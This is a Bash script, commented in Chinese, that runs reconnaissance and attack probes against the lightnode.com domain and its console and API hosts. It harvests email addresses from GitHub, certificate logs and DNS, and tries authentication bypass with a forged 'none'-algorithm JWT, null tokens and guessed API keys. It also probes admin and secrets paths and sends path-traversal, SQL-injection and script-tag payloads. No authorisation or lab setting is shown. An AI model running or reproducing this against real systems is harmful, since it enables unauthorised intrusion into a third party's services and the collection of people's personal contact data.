#!/bin/bash
# 继续收集 + API端点测试脚本

TARGET="lightnode.com"
WORK_DIR="/workspace/lightnode_recon/comprehensive"
mkdir -p "$WORK_DIR/test_results"

log() {
    echo "[+] $1"
}

warn() {
    echo "[!] $1"
}

# ============================================
# 1. 继续深度邮箱收集
# ============================================

continue_email_collection() {
    log "=== 继续邮箱收集 ==="
    
    > "$WORK_DIR/emails_additional.txt"
    
    # 1.1 从GitHub Gists提取
    log "从GitHub Gists提取..."
    curl -sk "https://api.github.com/search/code?q=lightnode.com+email&per_page=50" | \
        jq -r '.items[] | .html_url' 2>/dev/null | while read url; do
            if echo "$url" | grep -qi "gist"; then
                gist_id=$(echo "$url" | grep -oE "gist/[a-f0-9]+" | cut -d'/' -f2)
                curl -sk "https://api.github.com/gists/$gist_id" | \
                    jq -r '.files[].content' 2>/dev/null | \
                    grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(com|us|io)" | \
                    grep -i lightnode >> "$WORK_DIR/emails_additional.txt" || true
            fi
            sleep 0.5
        done
    
    # 1.2 从GitHub Issues提取
    log "从GitHub Issues提取..."
    for repo in "aurora423/next-lightnode-frontend" "LightNodeStaking/lightnodecontracts"; do
        curl -sk "https://api.github.com/repos/$repo/issues?per_page=30" | \
            jq -r '.[] | "\(.user.email)|\(.user.login)|\(.body)"' 2>/dev/null | \
            grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(com|us|io)" | \
            grep -iE "lightnode|gmail|outlook|yahoo" >> "$WORK_DIR/emails_additional.txt" || true
        sleep 1
    done
    
    # 1.3 从证书透明度深度提取
    log "从证书透明度深度提取..."
    curl -sk "https://crt.sh/?q=%.lightnode.com&output=json" | \
        jq -r '.[] | .name_value' 2>/dev/null | \
        grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(com|us|io)" | \
        sort -u >> "$WORK_DIR/emails_additional.txt" || true
    
    # 1.4 从DNS TXT记录提取（SPF/DMARC）
    log "从DNS TXT记录提取..."
    dig +short TXT "$TARGET" | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(com|us|io)" >> "$WORK_DIR/emails_additional.txt" || true
    dig +short TXT "_dmarc.$TARGET" | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(com|us|io)" >> "$WORK_DIR/emails_additional.txt" || true
    
    # 合并去重
    cat "$WORK_DIR/all_emails_final_complete.txt" "$WORK_DIR/emails_additional.txt" 2>/dev/null | \
        sort -u > "$WORK_DIR/all_emails_updated.txt"
    
    log "新增邮箱: $(wc -l < "$WORK_DIR/emails_additional.txt" 2>/dev/null || echo 0) 个"
    log "总邮箱数: $(wc -l < "$WORK_DIR/all_emails_updated.txt" 2>/dev/null || echo 0) 个"
}

# ============================================
# 2. API端点深度测试
# ============================================

test_api_endpoints() {
    log "=== API端点深度测试 ==="
    
    API_BASE="https://console.lightnode.com"
    OPENAPI_BASE="https://openapi.lightnode.com"
    
    # 2.1 GraphQL内省测试（多种方法）
    log "测试GraphQL内省..."
    
    # 方法1: GET查询参数
    curl -sk "$API_BASE/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D" \
        -o "$WORK_DIR/test_results/graphql_get.json" 2>/dev/null
    
    # 方法2: POST JSON
    curl -sk -X POST "$API_BASE/graphql" \
        -H "Content-Type: application/json" \
        -d '{"query":"{ __schema { queryType { name } } }"}' \
        -o "$WORK_DIR/test_results/graphql_post.json" 2>/dev/null
    
    # 方法3: POST GraphQL
    curl -sk -X POST "$API_BASE/graphql" \
        -H "Content-Type: application/graphql" \
        -d '{ __schema { queryType { name } } }' \
        -o "$WORK_DIR/test_results/graphql_post_graphql.json" 2>/dev/null
    
    # 检查结果
    for file in "$WORK_DIR/test_results/graphql_"*.json; do
        if [ -f "$file" ] && grep -q "__schema\|queryType\|errors" "$file" 2>/dev/null; then
            warn "GraphQL可能可访问: $file"
            cat "$file" | head -50
        fi
    done
    
    # 2.2 API认证绕过测试
    log "测试API认证绕过..."
    
    > "$WORK_DIR/test_results/api_auth_bypass.txt"
    
    # 读取API端点列表
    [ -f "$WORK_DIR/all_api_endpoints_final.txt" ] && \
        cat "$WORK_DIR/all_api_endpoints_final.txt" | head -30 | while read endpoint; do
            if [ -z "$endpoint" ]; then continue; fi
            
            # 测试1: 无认证
            response=$(curl -sk "$endpoint" -w "\n%{http_code}" 2>/dev/null)
            http_code=$(echo "$response" | tail -1)
            body=$(echo "$response" | head -n -1)
            
            if [ "$http_code" = "200" ] || [ "$http_code" = "201" ]; then
                echo "[✅ 无认证成功] $endpoint (HTTP $http_code)" >> "$WORK_DIR/test_results/api_auth_bypass.txt"
                echo "$body" > "$WORK_DIR/test_results/unauth_$(echo $endpoint | md5sum | cut -d' ' -f1).json" 2>/dev/null
            fi
            
            # 测试2: JWT None算法
            jwt_none="eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTYxOTk2MjJ9."
            response=$(curl -sk "$endpoint" \
                -H "Authorization: Bearer $jwt_none" \
                -w "\n%{http_code}" 2>/dev/null)
            http_code=$(echo "$response" | tail -1)
            
            if [ "$http_code" = "200" ] || [ "$http_code" = "201" ]; then
                echo "[✅ JWT None成功] $endpoint (HTTP $http_code)" >> "$WORK_DIR/test_results/api_auth_bypass.txt"
            fi
            
            # 测试3: 空Token
            response=$(curl -sk "$endpoint" \
                -H "Authorization: Bearer null" \
                -w "\n%{http_code}" 2>/dev/null)
            http_code=$(echo "$response" | tail -1)
            
            if [ "$http_code" = "200" ] || [ "$http_code" = "201" ]; then
                echo "[✅ 空Token成功] $endpoint (HTTP $http_code)" >> "$WORK_DIR/test_results/api_auth_bypass.txt"
            fi
            
            # 测试4: 弱API Key
            for key in "test" "demo" "admin" "123456" "00000000-0000-0000-0000-000000000000"; do
                response=$(curl -sk "$endpoint" \
                    -H "X-API-Key: $key" \
                    -w "\n%{http_code}" 2>/dev/null)
                http_code=$(echo "$response" | tail -1)
                
                if [ "$http_code" = "200" ] || [ "$http_code" = "201" ]; then
                    echo "[✅ 弱API Key成功] $endpoint (Key: $key, HTTP $http_code)" >> "$WORK_DIR/test_results/api_auth_bypass.txt"
                    break
                fi
            done
            
            sleep 0.3
        done
    
    log "认证绕过测试完成，结果: $WORK_DIR/test_results/api_auth_bypass.txt"
    
    # 2.3 敏感端点测试
    log "测试敏感端点..."
    
    > "$WORK_DIR/test_results/sensitive_endpoints.txt"
    
    sensitive_paths=(
        "/api/admin"
        "/api/users"
        "/api/config"
        "/api/secrets"
        "/api/keys"
        "/api/tokens"
        "/api/auth"
        "/api/v1/admin"
        "/api/v1/users"
        "/admin"
        "/internal"
        "/debug"
        "/test"
    )
    
    for path in "${sensitive_paths[@]}"; do
        for base in "$API_BASE" "$OPENAPI_BASE"; do
            url="$base$path"
            response=$(curl -sk "$url" -w "\n%{http_code}" 2>/dev/null)
            http_code=$(echo "$response" | tail -1)
            body=$(echo "$response" | head -n -1)
            
            if [ "$http_code" != "404" ] && [ "$http_code" != "403" ]; then
                echo "[!] $url (HTTP $http_code)" >> "$WORK_DIR/test_results/sensitive_endpoints.txt"
                echo "$body" | head -20 >> "$WORK_DIR/test_results/sensitive_endpoints.txt"
                echo "---" >> "$WORK_DIR/test_results/sensitive_endpoints.txt"
            fi
        done
    done
    
    # 2.4 OpenAPI文档解析
    log "解析OpenAPI文档..."
    
    if [ -f "$WORK_DIR/openapi_https:__console.lightnode.com_openapi.json.json" ]; then
        # 尝试提取JSON内容
        cat "$WORK_DIR/openapi_https:__console.lightnode.com_openapi.json.json" | \
            grep -oE '"(/api/[^"]+)"|"(/v[0-9]+/[^"]+)"' | \
            sort -u > "$WORK_DIR/test_results/openapi_paths.txt" 2>/dev/null || true
        
        log "从OpenAPI提取路径: $(wc -l < "$WORK_DIR/test_results/openapi_paths.txt" 2>/dev/null || echo 0) 个"
    fi
    
    # 2.5 错误信息分析（500错误可能泄露信息）
    log "测试错误信息泄露..."
    
    > "$WORK_DIR/test_results/error_info_leak.txt"
    
    # 测试不存在的端点，看错误信息
    test_endpoints=(
        "/api/test/../../etc/passwd"
        "/api/test/%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "/api/test?id=1' OR '1'='1"
        "/api/test?id=1\" OR \"1\"=\"1"
    )
    
    for endpoint in "${test_endpoints[@]}"; do
        for base in "$API_BASE" "$OPENAPI_BASE"; do
            url="$base$endpoint"
            response=$(curl -sk "$url" 2>/dev/null)
            
            if echo "$response" | grep -qiE "error|exception|stack|trace|mysql|postgres|mongo|redis|file|path"; then
                echo "[!] 可能的信息泄露: $url" >> "$WORK_DIR/test_results/error_info_leak.txt"
                echo "$response" | head -30 >> "$WORK_DIR/test_results/error_info_leak.txt"
                echo "---" >> "$WORK_DIR/test_results/error_info_leak.txt"
            fi
        done
    done
}

# ============================================
# 3. 技术栈深度识别
# ============================================

identify_tech_stack_deep() {
    log "=== 技术栈深度识别 ==="
    
    > "$WORK_DIR/tech_stack_backend.txt"
    
    # 3.1 分析错误页面
    log "分析错误页面..."
    for url in "https://www.lightnode.com/nonexistent12345" "https://console.lightnode.com/nonexistent12345"; do
        response=$(curl -sk "$url" 2>/dev/null)
        
        # 提取技术栈标识
        echo "$response" | grep -oE "(express|koa|fastify|nest|django|flask|spring|laravel|rails|phoenix)" | \
            sort -u >> "$WORK_DIR/tech_stack_backend.txt" || true
        
        # 提取数据库标识
        echo "$response" | grep -oE "(mysql|postgres|mongodb|redis|elasticsearch|dynamodb)" | \
            sort -u >> "$WORK_DIR/tech_stack_backend.txt" || true
    done
    
    # 3.2 分析响应头
    log "分析响应头..."
    curl -sk -I "https://console.lightnode.com" 2>/dev/null | \
        grep -iE "server|x-powered-by|x-backend|x-framework" >> "$WORK_DIR/tech_stack_backend.txt" || true
    
    # 3.3 分析JavaScript文件（查找API调用）
    log "分析JavaScript文件..."
    curl -sk "https://console.lightnode.com" 2>/dev/null | \
        grep -oE 'src="([^"]+\.js)"' | cut -d'"' -f2 | head -10 | while read js_file; do
            curl -sk "https://console.lightnode.com$js_file" 2>/dev/null | \
                grep -oE "(axios|fetch|api|endpoint|baseURL)" | head -5 >> "$WORK_DIR/tech_stack_backend.txt" || true
        done
}

# ============================================
# 4. 安全配置深度分析
# ============================================

analyze_security_deep() {
    log "=== 安全配置深度分析 ==="
    
    > "$WORK_DIR/security_config_complete.txt"
    
    for url in "https://www.lightnode.com" "https://console.lightnode.com" "https://openapi.lightnode.com"; do
        log "分析: $url"
        
        echo "=== $url ===" >> "$WORK_DIR/security_config_complete.txt"
        
        # 完整响应头
        curl -sk -I "$url" 2>/dev/null >> "$WORK_DIR/security_config_complete.txt"
        echo "" >> "$WORK_DIR/security_config_complete.txt"
        
        # CSP分析
        csp=$(curl -sk -I "$url" 2>/dev/null | grep -i "content-security-policy" || echo "")
        if [ -n "$csp" ]; then
            echo "CSP: $csp" >> "$WORK_DIR/security_config_complete.txt"
        else
            echo "CSP: 未设置" >> "$WORK_DIR/security_config_complete.txt"
        fi
        
        # WAF测试
        response=$(curl -sk "$url" \
            -H "X-Forwarded-For: 1.1.1.1" \
            -H "User-Agent: <script>alert(1)</script>" 2>/dev/null)
        
        if echo "$response" | grep -qiE "cloudflare|waf|blocked|forbidden|challenge"; then
            echo "WAF: 检测到防护" >> "$WORK_DIR/security_config_complete.txt"
        else
            echo "WAF: 未检测到明显防护" >> "$WORK_DIR/security_config_complete.txt"
        fi
        
        echo "" >> "$WORK_DIR/security_config_complete.txt"
    done
}

# ============================================
# 主执行
# ============================================

main() {
    log "=== 开始收集和测试 ==="
    
    continue_email_collection
    test_api_endpoints
    identify_tech_stack_deep
    analyze_security_deep
    
    log "=== 完成 ==="
    log "结果保存在: $WORK_DIR/test_results/"
    
    # 生成汇总
    echo "=== 测试汇总 ===" > "$WORK_DIR/test_results/SUMMARY.txt"
    echo "认证绕过: $(wc -l < "$WORK_DIR/test_results/api_auth_bypass.txt" 2>/dev/null || echo 0) 个" >> "$WORK_DIR/test_results/SUMMARY.txt"
    echo "敏感端点: $(wc -l < "$WORK_DIR/test_results/sensitive_endpoints.txt" 2>/dev/null || echo 0) 个" >> "$WORK_DIR/test_results/SUMMARY.txt"
    echo "错误泄露: $(wc -l < "$WORK_DIR/test_results/error_info_leak.txt" 2>/dev/null || echo 0) 个" >> "$WORK_DIR/test_results/SUMMARY.txt"
    
    cat "$WORK_DIR/test_results/SUMMARY.txt"
}

main "$@"
